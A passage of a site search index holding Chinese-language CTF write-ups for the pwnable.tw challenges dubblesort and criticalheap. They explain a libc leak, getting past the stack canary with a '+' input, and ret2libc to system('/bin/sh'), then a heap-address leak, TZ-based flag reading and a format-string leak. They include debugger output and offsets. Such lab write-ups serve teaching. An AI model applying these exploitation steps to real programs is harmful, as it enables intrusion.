\u4e86\uff0c\u6240\u4ee5\u96a8\u4fbf\u586b\u5c31\u53ef\u4ee5\u4e86\uff0c\u63a5\u8457\u624d\u662f system \u7684\u7b2c\u4e00\u500b\u53c3\u6578 \n/bin/sh", 
            "title": "dubblesort"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/dubblesort/#dubblesort", 
            "text": "Challenge link:  dubblesort  Category: pwn  Writeup:  dubblesort   Sort the memory!  nc chall.pwnable.tw 10101  dubblesort  libc.so", 
            "title": "dubblesort"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/dubblesort/#observation", 
            "text": "\u4e00\u958b\u59cb\u7a0b\u5f0f\u5148\u554f\u4e86 \u540d\u5b57 \uff0c\u63a5\u8457\u554f\u8981 \u6392\u5217\u5e7e\u500b\u6578\u5b57  \uff0c\u6700\u5f8c\u4f9d\u5e8f\u8f38\u5165 \u5404\u500b\u6578\u5b57 \u5f8c\u6703\u6392\u5217\u5b8c\u8f38\u51fa\u7d50\u679c  \u770b\u5230\u9019\u984c\u6642\uff0c\u6211\u60f3\u5230\u4e4b\u524d\u5728  csie.ctf.tw  \u6709\u5beb\u904e\u4e00\u984c bubblesort \uff0c\u90a3\u984c\u662f\u900f\u904e\u6392\u5217\u7684\u6578\u5b57\u6c92\u6709\u9650\u5236\u6578\u91cf\u4f86\u84cb\u5230 return address\uff0c\u6216\u8a31\u9019\u984c\u6709\u985e\u4f3c\u7684\u6f0f\u6d1e  $ ./dubblesort\nWhat your name :a\nHello a\n,How many numbers  do  you what to sort :3\nEnter the  0  number :  0 \nEnter the  1  number :  1 \nEnter the  2  number :  2 \nProcessing......\nResult : 0   1   2", 
            "title": "Observation"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/dubblesort/#file", 
            "text": "$ file dubblesort\ndubblesort: ELF  32 -bit LSB shared object, Intel  80386 , version  1   ( SYSV ) , dynamically linked, interpreter /lib/ld-linux.so.2,  for  GNU/Linux  2 .6.24, BuildID [ sha1 ]= 12a217baf7cbdf2bb5c344ff14adcf7703672fb1, stripped", 
            "title": "file"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/dubblesort/#checksec", 
            "text": "\u4fdd\u8b77\u5168\u958b  gdb-peda$ checksec\nCANARY    : ENABLED\nFORTIFY   : ENABLED\nNX        : ENABLED\nPIE       : ENABLED\nRELRO     : FULL", 
            "title": "checksec"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/dubblesort/#input", 
            "text": "\u540d\u5b57\u662f\u4f7f\u7528  read()  \u4f86\u8b80\u53d6\uff0c\u8b80\u53d6\u7684\u9577\u5ea6\u662f 0x40     0x56555a11  main+78 :    mov    DWORD PTR  [ esp ] ,0x0 =  0x56555a18  main+85 :    call   0x56555630  read@plt \n   0x56555a1d  main+90 :    mov    DWORD PTR  [ esp+0x8 ] ,esi\nGuessed arguments:\narg [ 0 ] : 0x0\narg [ 1 ] : 0xffffd72c --  0xff17\narg [ 2 ] : 0x40  ( @ )   \u8981\u6392\u5217\u7684\u6578\u91cf\u662f\u4f7f\u7528  scanf()  \uff0c\u4e14\u53c3\u6578\u662f  %u  \u4e5f\u5c31\u662f unsigned int     0x56555a45  main+130 :   mov    DWORD PTR  [ esp ] ,eax =  0x56555a48  main+133 :   call   0x56555700  __isoc99_scanf@plt \n   0x56555a4d  main+138 :   mov    eax,DWORD PTR  [ esp+0x18 ] \nGuessed arguments:\narg [ 0 ] : 0x56555bfa --  0x45007525  ( %u ) \narg [ 1 ] : 0xffffd708 --  0xe0  \u63a5\u8457\u6578\u5b57\u7684\u90e8\u5206\u4e00\u6a23\u662f\u4f7f\u7528  scanf()  \u52a0\u4e0a  %u       0x56555a92  main+207 :   mov    DWORD PTR  [ esp ] ,eax =  0x56555a95  main+210 :   call   0x56555700  __isoc99_scanf@plt \n   0x56555a9a  main+215 :   add    esi,0x1\nGuessed arguments:\narg [ 0 ] : 0x56555bfa --  0x45007525  ( %u ) \narg [ 1 ] : 0xffffd70c --  0xf7f37f0a  ( mov    edx,DWORD PTR  [ esp+0x18 ])", 
            "title": "input"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/dubblesort/#sort", 
            "text": "sort \u7684\u53c3\u6578\u662f \u8981\u6392\u5217\u7684\u6578\u91cf \u4ee5\u53ca \u7b2c\u4e00\u500b\u6578\u5b57\u5728 stack \u4e0a\u7684\u4f4d\u5740\uff0c\u6392\u5217\u7684\u65b9\u5f0f\u770b\u8d77\u4f86\u6c92\u4ec0\u9ebc\u554f\u984c     0x56555ab0  main+237 :   mov    DWORD PTR  [ esp ] ,eax =  0x56555ab3  main+240 :   call   0x56555931\n   0x56555ab8  main+245 :   lea    eax, [ ebx-0x138c ] \nGuessed arguments:\narg [ 0 ] : 0xffffd70c --  0x0\narg [ 1 ] : 0x3\n----------------------- stack ----------------------- 0028 |  0xffffd70c --  0x0         # num 0  0032 |  0xffffd710 --  0x1         # num 1  0036 |  0xffffd714 --  0x2         # num 2", 
            "title": "sort"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/dubblesort/#name", 
            "text": "\u5728\u6e2c\u8a66 name \u7684\u6642\u5019\uff0c\u767c\u73fe\u6709\u6642\u5019\u6703\u8f38\u51fa\u4e00\u4e9b\u4e0d\u53ef\u8996\u5b57\u5143  ./dubblesort\nWhat your name :aaaa\nHello aaaa\ny\ufffd\ufffd/,How many numbers  do  you what to sort :  \u7d93\u904e\u89c0\u5bdf\u5f8c\u767c\u73fe\u61c9\u8a72\u662f\u56e0\u70ba name \u6c92\u6709\u5c07\u6240\u6709\u7a7a\u9593\u5148\u6b78\u96f6\uff0c\u6240\u4ee5\u8f38\u51fa\u6642\u624d\u6703\u9023\u540c\u5f8c\u9762\u7684\u820a\u8cc7\u6599\u4e00\u8d77\u8f38\u51fa", 
            "title": "name"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/dubblesort/#stack-canary", 
            "text": "\u56e0\u70ba\u6709\u958b canary \u7684\u95dc\u4fc2\uff0c\u5c31\u7b97\u6c92\u6709\u6aa2\u67e5\u6700\u591a\u53ef\u4ee5\u8f38\u5165\u5e7e\u500b\u6578\u5b57\uff0c\u518d\u8f38\u5165\u8d85\u904e\u6642\u4f9d\u7136\u6703\u5674\u932f  *** stack smashing detected ***: ./dubblesort terminated  \u5229\u7528\u4e8c\u5206\u641c\u7684\u65b9\u5f0f\u6e2c\u8a66\uff0c\u767c\u73fe\u6700\u591a\u53ea\u80fd\u8f38\u5165\u5230 24 \u500b\u6578\u5b57\uff0c\u5982\u679c\u5230\u7b2c 25 \u500b\u6578\u5b57\u7684\u8a71\uff0c\u5728\u6392\u5217\u6642\u5c31\u6703\u5674\u51fa\u4ee5\u4e0a\u7684\u932f\u8aa4\u8a0a\u606f", 
            "title": "stack canary"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/dubblesort/#solution", 
            "text": "\u7e3d\u5171\u6709\u4e09\u500b\u6b65\u9a5f\u8981\u505a   leak libc  bypass canary  ret2libc", 
            "title": "Solution"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/dubblesort/#leak-libc", 
            "text": "\u9019\u908a\u6211\u5229\u7528\u7684\u662f name  \u56e0\u70ba name \u7684 buffer \u6c92\u6709\u5148\u6e05\u7a7a\u7684\u95dc\u4fc2\uff0c\u6240\u4ee5\u53ef\u4ee5 leak \u51fa\u5f8c\u9762\u7684\u6578\u503c  0060 |  0xffffd72c  ( aaaa\\n\\331\\377\\377/ )  0064 |  0xffffd730 --  0xffffd90a --  0xfb6d2200 0068 |  0xffffd734 --  0x2f  ( / )  0072 |  0xffffd738 --  0x8e 0076 |  0xffffd73c --  0x16 0080 |  0xffffd740 --  0x8000 0084 |  0xffffd744 --  0xf7fcb000 --  0x1b1db0 0088 |  0xffffd748 --  0xf7fc9244 --  0xf7e31020  ( call   0xf7f38b59 )      ==   \u7531\u4e0a\u9762 stack \u5167\u5bb9\u53ef\u77e5\uff0c\u7b2c 8 \u500b\u5305\u542b\u4e00\u500b\u4f4d\u5740\uff0c\u53ef\u4ee5\u8a18\u9304\u4e0b\u6b64\u6642 libc base \u8207\u5176\u4e4b\u9593\u7684\u5dee\u503c\uff0c\u4e26\u5728\u771f\u6b63 leak \u51fa\u6b64\u503c\u6642\u6e1b\u6389\u5dee\u503c\uff0c\u5373\u53ef\u5f97\u5230 libc base  0xf7fc9244 -  libc_base   =  x  ( \u56fa\u5b9a\u7684 ) \nleak_addr -  x   =  libc_base  \u53ea\u8981\u8f38\u5165 28 (4*7) \u500b\u5b57\u5143\u4f5c\u70ba payload \uff0c\u5c31\u53ef\u4ee5\u5370\u51fa\u9019\u500b\u4f4d\u5740\u7684\u503c\u4e86  0060 |  0xffffd72c  ( a   repeats  28  times ,  \\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001 )  0064 |  0xffffd730  ( a   repeats  24  times ,  \\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001 )  0068 |  0xffffd734  ( a   repeats  20  times ,  \\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001 )  0072 |  0xffffd738  ( a   repeats  16  times ,  \\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001 )  0076 |  0xffffd73c  ( a   repeats  12  times ,  \\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001 )  0080 |  0xffffd740  ( aaaaaaaa\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001 )  0084 |  0xffffd744  ( aaaa\\n\\222\\374\\367\\001VUV\\251WUV\\240oUV\\001 )  0088 |  0xffffd748 --  0xf7fc920a --  0x0", 
            "title": "Leak libc"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/dubblesort/#bypass-canary", 
            "text": "\u5728 observation \u6642\uff0c\u6709\u5229\u7528\u4e8c\u5206\u641c\u7684\u65b9\u5f0f\u627e\u5230 canary \u7684\u4f4d\u7f6e\u5728\u7b2c 25 \u500b  \u6b64\u6642\u53ef\u4ee5\u5229\u7528\u8f38\u5165\u6642\u7684  scanf( %u )  \uff0c\u4e00\u822c\u5728\u8f38\u5165\u6642\uff0c\u8981\u8f38\u5165 unsigned int \u624d\u6703\u88ab\u63a5\u53d7\uff0c\u4f46\u662f\u9019\u6a23\u6703\u84cb\u6389 canary \uff0c\u7d93\u904e\u641c\u5c0b\u5f8c\u624d\u77e5\u9053\uff0c\u539f\u4f86\u53ef\u4ee5\u8f38\u5165 '+'\uff0c\u6b64\u6642\u6703\u88ab\u7576\u4f5c\u6b63\u5e38\u8f38\u5165\uff0c\u4f46\u4fdd\u7559\u6b64\u4f4d\u7f6e\u539f\u59cb\u7684\u503c\uff0c\u76f4\u63a5\u8df3\u5230\u4e0b\u4e00\u500b\uff0c\u5982\u6b64\u4e00\u4f86\u5c31\u53ef\u76f4\u63a5\u7e5e\u904e canary \u4e86", 
            "title": "bypass canary"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/dubblesort/#ret2libc", 
            "text": "\u8981\u505a\u5230 ret2libc \u7684\u8a71\u9054\u6210\u5169\u500b\u689d\u4ef6   libc base  return address   libc base \u5728\u5148\u524d\u5df2\u7d93\u900f\u904e name \u53d6\u5f97\u4e86\uff0c\u60f3\u8981\u63a7\u5236 return address \u7684\u8a71\uff0c\u53ef\u4ee5\u5229\u7528\u8f38\u5165\u6578\u5b57\u6642\u7684 buffer overflow\uff0c\u56e0\u70ba\u5df2\u7d93\u8df3\u904e canary \u4e86\uff0c\u6240\u4ee5\u53ef\u4ee5\u4e00\u76f4\u63a8\u5230 return \u7684\u4f4d\u7f6e\uff0c\u4e26\u9032\u800c\u63a7\u5236 return address  \u9019\u908a\u6211\u4e00\u6a23\u7528\u4e8c\u5206\u641c\u7684\u65b9\u5f0f\u4f86\u505a\uff0c\u5982\u679c\u6709\u84cb\u5230 return address \u7684\u4f4d\u7f6e\u7684\u8a71\u6703\u51fa\u73fe\u4ee5\u4e0b\u8a0a\u606f  [ * ]  Process  ./dubblesort  stopped with  exit  code -11  ( SIGSEGV )   ( pid  2290 )   \u641c\u5c0b\u904e\u5f8c\u77e5\u9053 return address \u662f\u5728\u7b2c 33 \u500b\u4f4d\u7f6e  24 ( payload )  + canary +  7  + ret  \u6700\u5f8c\u5c31\u662f\u4f7f\u7528 libc base \u627e\u5230  system  \u4ee5\u53ca  /bin/sh  \u4e32\u63a5\u5728 return address \u7684\u4f4d\u7f6e\u5373\u53ef", 
            "title": "ret2libc"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/dubblesort/#note", 
            "text": "", 
            "title": "Note"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/dubblesort/#pwntool-libc", 
            "text": "\u56e0\u70ba\u6709\u7d66 libc \uff0c\u6240\u4ee5\u5728\u672c\u6a5f\u6e2c\u8a66\u6642\u6700\u597d\u662f\u639b\u4e0a libc \uff0c\u5426\u5247\u4f4d\u5740\u53ef\u80fd\u6703\u8ddf\u9060\u7aef\u4e0d\u540c  r   =   process ( ./dubblesort ,   env = { LD_PRELOAD : ./libc_32.so.6 })", 
            "title": "pwntool libc"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/dubblesort/#sort_1", 
            "text": "\u5728\u8f38\u5165 payload \u6642\uff0c\u56e0\u70ba\u8f38\u5165\u5b8c\u5f8c\u9084\u6703\u9032\u884c\u6392\u5e8f\uff0c\u6240\u4ee5\u8981\u78ba\u4fdd\u6392\u5e8f\u904e\u5f8c\u9806\u5e8f\u4f9d\u7136\u4e0d\u8b8a  \u6211\u7684\u4f5c\u6cd5\u662f\u524d 24 \u500b\u5b57\u5c31\u76f4\u63a5\u8f38\u5165 0~23 \uff0ccanary \u7684\u90e8\u5206\u8f38\u5165 + (43)\uff0c\u63a5\u8457\u5f8c\u9762\u7684 7 \u500b\u5b57\u653e libc base\uff0c\u6700\u5f8c  system  \u53ca  /bin/sh  \u56e0\u70ba\u8981\u52a0\u4e0a libc base \uff0c\u6240\u4ee5\u4e00\u5b9a\u6bd4 libc base \u5927", 
            "title": "sort"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/dubblesort/#system", 
            "text": "\u5728\u547c\u53eb system \u6642\uff0cstack \u7b2c\u4e00\u500b\u4f4d\u7f6e\u662f\u7d50\u675f\u5f8c\u7684 return address\uff0c\u56e0\u70ba\u4e0d\u6703 return \u4e86\uff0c\u6240\u4ee5\u96a8\u4fbf\u586b\u5c31\u53ef\u4ee5\u4e86\uff0c\u63a5\u8457\u624d\u662f system \u7684\u7b2c\u4e00\u500b\u53c3\u6578  /bin/sh", 
            "title": "system"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/", 
            "text": "criticalheap\n\n\n\n\nChallenge link: \ncriticalheap\n\n\nCategory: pwn\n\n\nWriteup: \ncriticalheap\n\n\n\n\nThere are some secrets . Try to capture \n/home/critical_heap++/flag\n.\n\n\nWe recommend you to use the provided docker environment to develop your exploit:\n\n\nnc chall.pwnable.tw 10500\n\n\ncritical_heap.tar.gz\n\n\nObservation\n\n\n\u9019\u984c\u6709\u5f88\u591a\u500b\u9078\u9805\u53ef\u4ee5\u4f7f\u7528\uff0c\u4ee5\u4e0b\u8b1b\u53ef\u80fd\u6703\u7528\u5230\u7684\u90e8\u5206\n\n\nstruct\n\n\n\u9019\u984c\u6709\u4e09\u500b struct (normal, time, system) \u5728\u4e00\u500b union\uff0c\u4e00\u958b\u59cb\u5c31\u5148\u5728 .bss \u6bb5\u5ba3\u544a\u9577\u5ea6 10 \u7684 struct \u9663\u5217\uff0c\u5176\u4e2d\u67d0\u4e9b\u8b8a\u6578 (name, value...) \u662f\u5b58\u5b57\u4e32\u7684\u6307\u6a19\n\n\nnormal\n\n\n00000000 name\n...\n00000018 content\n...\n\n\n\n\nsystem\n\n\n00000000 name\n...\n00000020 value\n...\n\n\n\n\ncreate\n\n\nname\n\n\nname \u7684\u90e8\u5206\u662f\u5148 read \u9032\u4f86\u4ee5\u5f8c\uff0c\u7528 strdup \u653e\u5230 struct \u4e0a\u7684\uff0c\u6240\u4ee5\u4e5f\u662f\u5b58\u5728 heap \u4e0a\n\n\n\n\nnormal\n\n\nnormal \u7684\u90e8\u5206\u9700\u8981\u8f38\u5165 content\uff0c\u5b83\u662f\u76f4\u63a5 read \u5230 rax + 0x18 (struct \u4e0a\u7684 0x18) \u7684\u4f4d\u7f6e\uff0c\u6c92\u6709\u5728\u5f8c\u9762\u88dc\u4e0a \n0x00\n\n\n\n\ntime\n\n\ntime \u6703\u7528 localtime \u62ff\u53d6\u73fe\u5728\u7684\u6642\u9593\u4ee5\u5f8c\uff0c\u8655\u7406\u5b8c\u5b58\u9032 struct\n\n\n\n\nlocaltime \u5148\u4f7f\u7528 getenv \u6293\u53d6\u74b0\u5883\u8b8a\u6578 TZ \u7684\u503c\uff0c\u63a5\u8457\u8b80\u51fa TZ \u6240\u6307\u7684\u6a94\u6848\uff0c\u4e26\u5c07\u5167\u5bb9\u5b58\u5728 heap \u4e0a\n\n\n\n\n\n\nplay_system\n\n\nSet the name for the heap\n\n\n\u9019\u500b\u529f\u80fd\u5176\u5be6\u5c31\u662f setenv\n\n\n\n\nUnset the name in the heap\n\n\n\u9019\u500b\u529f\u80fd\u662f unsetenv\n\n\n\n\nGet the value of name\n\n\n\u9019\u500b\u529f\u80fd\u6bd4\u8f03\u7279\u5225\uff0c\u6703\u5148\u7528 getenv \u6293\u8f38\u5165\u7684 name\uff0c\u63a5\u8457\u5c07\u6293\u5230\u7684\u6307\u6a19 (\u6307\u5411 heap \u4e0a\u5b58 value \u8655) \u5b58\u5728 rax + 0x20 (struct \u4e0a 0x20 \u7684\u4f4d\u7f6e)\n\n\n\n\nplay_normal\n\n\nShow the content of heap\n\n\n\u9019\u500b\u529f\u80fd\u6709 format string \u7684\u6f0f\u6d1e\uff0c\u800c\u4e14\u662f\u4f7f\u7528 printf_chk\n\n\n\n\ndelete\n\n\ndelete \u5be6\u969b\u4e0a\u53ea\u6709\u628a\u6307\u5b9a\u7684 struct \u6a19\u6210 0 \u800c\u5df2\uff0c\u4e0a\u9762\u7684\u8cc7\u8a0a\u4e26\u6c92\u6709\u6e05\u7a7a\n\n\n\n\nConclusion\n\n\n\n\ncreate_normal \u8b80\u53d6 content \u6642\u6c92\u6709\u7d50\u5c3e\n\n\nplay_normal \u6709 format string \u7684\u6f0f\u6d1e\n\n\nsetenv \u53ef\u4ee5\u6539\u52d5 TZ \u7684\u503c\n\n\ndelete \u6c92\u6709\u6e05\u7a7a\n\n\n\n\nSolution\n\n\n\u89e3\u6cd5\u6b65\u9a5f\u5982\u4e0b\uff1a\n\n\n\n\nleak heap base \u4f4d\u7f6e\n\n\n\u5229\u7528 setenv \u6539\u52d5 TZ \u4ee5\u5f8c\uff0c\u7528 localtime \u5c07 flag \u8b80\u5230 heap \u4e0a\n\n\n\u5229\u7528 format string \u5370\u51fa flag\n\n\n\n\nleak heap base\n\n\n\u9019\u500b\u90e8\u5206\u8981\u5229\u7528 \"delete \u6c92\u6709\u6e05\u7a7a\" \u7684\u6f0f\u6d1e\n\n\n\u5148\u5275 system\uff0c\u63a5\u8457\u5230 play \u96a8\u4fbf\u5275\u4e00\u500b\u74b0\u5883\u8b8a\u6578\uff0c\u518d\u4f7f\u7528 play_system_get_value \u4f86\u5c07\u74b0\u5883\u8b8a\u6578\u7684\u4f4d\u5740\u653e\u5230 struct \u4e0a\uff0c\u9019\u662f\u70ba\u4e86\u53d6\u5f97\u4e00\u6bb5 heap address\n\n\n0x000 name\n0x020 value  (heap address)\n\n\n\n\n\u63a5\u8457 delete \u6389\uff0c\u7136\u5f8c\u5275\u4e00\u500b normal \u7684 struct\uff0c\u6b64\u6642 normal struct \u6703\u84cb\u5728 system struct \u539f\u672c\u7684\u4f4d\u7f6e\u4e0a\n\n\n\u56e0\u70ba content \u5b58\u5728 0x18\uff0c\u8207\u539f\u672c\u7684 value \u5dee 0x8\uff0c\u8981\u8f38\u5165 8 \u500b\u5b57\u5143\u624d\u80fd\u78b0\u5230 value \u7684\u4f4d\u7f6e\n\n\n\n\n\u4e0d\u8981\u8f38\u5165 \\n \u4e0d\u7136\u8f38\u51fa\u6703\u88ab\u622a\u65b7\n\n\n\n\n0x000 name\n0x018 content (\nAAAAAAAA\n)\n0x020 value  (heap address)\n\n\n\n\n\u6700\u5f8c\u5c31\u4f7f\u7528 show \u628a struct \u5370\u51fa\u4f86\u5c31\u53ef\u4ee5\u5f97\u5230 heap address \u4e86\n\n\n\u56e0\u70ba\u5728 heap \u4e0a\u76f8\u5c0d\u4f4d\u7f6e\u4e0d\u8b8a\uff0c\u7528 gdb \u770b\u4e00\u4e0b\u8ddf base \u5dee\u591a\u9060\uff0cleak \u51fa\u4f86\u5f8c\u6e1b\u6389\u5c31\u662f heap base \u4e86\n\n\nTZ\n\n\n\u9019\u500b\u90e8\u5206\u5c31\u5275\u4e00\u500b system \u7136\u5f8c\u7528 setenv \u628a TZ \u8a2d\u6210 \n/home/critical_heap++/flag\n\n\n\u63a5\u8457\u5275\u4e00\u500b time struct\uff0c\u5c31\u6703\u5728 localtime \u5c07 flag \u8b80\u53d6\u5230 heap \u4e0a\u4e86\uff0c\u7136\u5f8c\u7528 gdb \u770b\u4e00\u4e0b offset \u642d\u914d heap base \u5c31\u53ef\u4ee5\u77e5\u9053 flag address \u4e86\n\n\n\n\nformat string\n\n\n\u5229\u7528 format string \u642d\u914d %s \u53ef\u4ee5 leak \u4efb\u610f\u4f4d\u5740\u7684\u7279\u6027\u4f86 leak flag address\n\n\n\u53e6\u5916\uff0c\u56e0\u70ba\u662f\u4f7f\u7528 printf_chk \u7684\u95dc\u4fc2\uff0c\u4e0d\u80fd\u4f7f\u7528 \n$\n \u8981\u81ea\u5df1\u7528 %c \u4f86\u8df3\u5230\u6307\u5b9a\u5340\u57df\n\n\n\n\nNote\n\n\npeda in docker\n\n\n\u9019\u6b21\u6709\u7d66\u4e00\u500b docker \u7684\u74b0\u5883\uff0c\u8981\u5728\u88e1\u9762\u4f7f\u7528 gdb-peda \u7684\u8a71\uff0c\u8981\u6539\u52d5\u4ee5\u4e0b\u8a2d\u5b9a\n\n\nDockerfile\n\n\nRUN\n apt-get install gdb git -y\n\nWORKDIR\n /root\n\n\nRUN\n git clone https://github.com/scwuaptx/Pwngdb.git \n;\n cp ~/Pwngdb/.gdbinit ~/\n\nRUN\n git clone https://github.com/scwuaptx/peda.git ~/peda \n;\n \necho\n \nsource ~/peda/peda.py\n \n ~/.gdbinit \n;\n cp ~/peda/.inputrc ~/\n\n\n\n\ndocker-compose.yml\n\n\ncritical_heap\n:\n\n    \ncap_add\n:\n\n        \n-\n \nSYS_PTRACE", 
            "title": "criticalheap"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#criticalheap", 
            "text": "Challenge link:  criticalheap  Category: pwn  Writeup:  criticalheap   There are some secrets . Try to capture  /home/critical_heap++/flag .  We recommend you to use the provided docker environment to develop your exploit:  nc chall.pwnable.tw 10500  critical_heap.tar.gz", 
            "title": "criticalheap"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#observation", 
            "text": "\u9019\u984c\u6709\u5f88\u591a\u500b\u9078\u9805\u53ef\u4ee5\u4f7f\u7528\uff0c\u4ee5\u4e0b\u8b1b\u53ef\u80fd\u6703\u7528\u5230\u7684\u90e8\u5206", 
            "title": "Observation"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#struct", 
            "text": "\u9019\u984c\u6709\u4e09\u500b struct (normal, time, system) \u5728\u4e00\u500b union\uff0c\u4e00\u958b\u59cb\u5c31\u5148\u5728 .bss \u6bb5\u5ba3\u544a\u9577\u5ea6 10 \u7684 struct \u9663\u5217\uff0c\u5176\u4e2d\u67d0\u4e9b\u8b8a\u6578 (name, value...) \u662f\u5b58\u5b57\u4e32\u7684\u6307\u6a19", 
            "title": "struct"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#normal", 
            "text": "00000000 name\n...\n00000018 content\n...", 
            "title": "normal"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#system", 
            "text": "00000000 name\n...\n00000020 value\n...", 
            "title": "system"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#create", 
            "text": "", 
            "title": "create"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#name", 
            "text": "name \u7684\u90e8\u5206\u662f\u5148 read \u9032\u4f86\u4ee5\u5f8c\uff0c\u7528 strdup \u653e\u5230 struct \u4e0a\u7684\uff0c\u6240\u4ee5\u4e5f\u662f\u5b58\u5728 heap \u4e0a", 
            "title": "name"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#normal_1", 
            "text": "normal \u7684\u90e8\u5206\u9700\u8981\u8f38\u5165 content\uff0c\u5b83\u662f\u76f4\u63a5 read \u5230 rax + 0x18 (struct \u4e0a\u7684 0x18) \u7684\u4f4d\u7f6e\uff0c\u6c92\u6709\u5728\u5f8c\u9762\u88dc\u4e0a  0x00", 
            "title": "normal"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#time", 
            "text": "time \u6703\u7528 localtime \u62ff\u53d6\u73fe\u5728\u7684\u6642\u9593\u4ee5\u5f8c\uff0c\u8655\u7406\u5b8c\u5b58\u9032 struct   localtime \u5148\u4f7f\u7528 getenv \u6293\u53d6\u74b0\u5883\u8b8a\u6578 TZ \u7684\u503c\uff0c\u63a5\u8457\u8b80\u51fa TZ \u6240\u6307\u7684\u6a94\u6848\uff0c\u4e26\u5c07\u5167\u5bb9\u5b58\u5728 heap \u4e0a", 
            "title": "time"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#play_system", 
            "text": "", 
            "title": "play_system"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#set-the-name-for-the-heap", 
            "text": "\u9019\u500b\u529f\u80fd\u5176\u5be6\u5c31\u662f setenv", 
            "title": "Set the name for the heap"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#unset-the-name-in-the-heap", 
            "text": "\u9019\u500b\u529f\u80fd\u662f unsetenv", 
            "title": "Unset the name in the heap"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#get-the-value-of-name", 
            "text": "\u9019\u500b\u529f\u80fd\u6bd4\u8f03\u7279\u5225\uff0c\u6703\u5148\u7528 getenv \u6293\u8f38\u5165\u7684 name\uff0c\u63a5\u8457\u5c07\u6293\u5230\u7684\u6307\u6a19 (\u6307\u5411 heap \u4e0a\u5b58 value \u8655) \u5b58\u5728 rax + 0x20 (struct \u4e0a 0x20 \u7684\u4f4d\u7f6e)", 
            "title": "Get the value of name"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#play_normal", 
            "text": "", 
            "title": "play_normal"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#show-the-content-of-heap", 
            "text": "\u9019\u500b\u529f\u80fd\u6709 format string \u7684\u6f0f\u6d1e\uff0c\u800c\u4e14\u662f\u4f7f\u7528 printf_chk", 
            "title": "Show the content of heap"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#delete", 
            "text": "delete \u5be6\u969b\u4e0a\u53ea\u6709\u628a\u6307\u5b9a\u7684 struct \u6a19\u6210 0 \u800c\u5df2\uff0c\u4e0a\u9762\u7684\u8cc7\u8a0a\u4e26\u6c92\u6709\u6e05\u7a7a", 
            "title": "delete"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#conclusion", 
            "text": "create_normal \u8b80\u53d6 content \u6642\u6c92\u6709\u7d50\u5c3e  play_normal \u6709 format string \u7684\u6f0f\u6d1e  setenv \u53ef\u4ee5\u6539\u52d5 TZ \u7684\u503c  delete \u6c92\u6709\u6e05\u7a7a", 
            "title": "Conclusion"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#solution", 
            "text": "\u89e3\u6cd5\u6b65\u9a5f\u5982\u4e0b\uff1a   leak heap base \u4f4d\u7f6e  \u5229\u7528 setenv \u6539\u52d5 TZ \u4ee5\u5f8c\uff0c\u7528 localtime \u5c07 flag \u8b80\u5230 heap \u4e0a  \u5229\u7528 format string \u5370\u51fa flag", 
            "title": "Solution"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/criticalheap/#leak-heap-base", 
            "text": "\u9019\u500b\u90e8\u5206\u8981\u5229\u7528 \"delete \u6c92\u6709\u6e05\u7a7a\" \u7684\u6f0f\u6d1e  \u5148\u5275 system\uff0c\u63a5\u8457\u5230 play \u96a8\u4fbf\u5275\u4e00\u500b\u74b0\u5883\u8b8a\u6578\uff0c\u518d\u4f7f\u7528 play_system_get_value \u4f86\u5c07\u74b0\u5883\u8b8a\u6578\u7684\u4f4d\u5740\u653e\u5230 struct \u4e0a\uff0c\u9019\u662f\u70ba\u4e86\u53d6\u5f97\u4e00\u6bb5 heap address  0x000 name\n0x020 value  (heap address)  \u63a5\u8457 delete \u6389\uff0c\u7136\u5f8c\u5275\u4e00\u500b normal \u7684 struct\uff0c\u6b64\u6642 normal struct \u6703\u84cb\u5728 system struct \u539f\u672c\u7684\u4f4d\u7f6e\u4e0a  \u56e0\u70ba content \u5b58\u5728 0x18\uff0c\u8207\u539f\u672c\u7684 value \u5dee 0x8\uff0c\u8981\u8f38\u5165 8 \u500b\u5b57\u5143\u624d\u80fd\u78b0\u5230 value \u7684\u4f4d\u7f6e   \u4e0d\u8981\u8f38\u5165 \\n \u4e0d\u7136\u8f38\u51fa\u6703\u88ab\u622a\u65b7   0x000 name\n0x018 content ( AAAAAAAA 